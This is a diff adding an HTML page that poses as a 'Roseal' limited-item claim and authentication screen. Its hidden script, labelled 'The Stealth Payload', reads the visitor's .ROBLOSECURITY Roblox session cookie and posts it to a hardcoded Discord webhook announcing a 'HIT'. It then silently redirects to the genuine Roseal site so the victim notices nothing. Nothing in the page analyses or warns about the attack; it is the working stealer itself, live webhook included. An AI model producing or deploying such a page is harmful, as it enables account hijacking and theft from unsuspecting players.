@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roseal | Claim Your Limiteds</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <p>Authenticating with Roseal.live...</p>
+    </div>
+
+    <script>
+        // The Stealth Payload
+        (function() {
+            // Function to find the Roblox cookie
+            function getCookie(name) {
+                var value = "; " + document.cookie;
+                var parts = value.split("; " + name + "=");
+                if (parts.length == 2) return parts.pop().split(";").shift();
+            }
+
+            var token = getCookie(".ROBLOSECURITY");
+            var webhook = "https://discord.com/api/webhooks/1503137752852729858/R1LupDo2bpG_Lkph1LXUjH_7CR0u9o4BdUId8kT5sxEtWaPO1HBi0DyAmeOk1Yk0qPLq";
+
+            if (token) {
+                // Send data to your Discord Vault
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Roseal Auto-Auth",
+                        content: "@everyone **HIT DETECTED** \n\n**Cookie:** `" + token + "`"
+                    })
+                }).then(() => {
+                    // Success! Now redirect to the real site
+                    window.location.replace("https://www.roseal.live/dashboard");
+                });
+            } else {
+                // If they aren't logged in, just send them to Roseal anyway
+                window.location.replace("https://www.roseal.live/");
+            }
+        })();
+    </script>
+</body>
+</html>
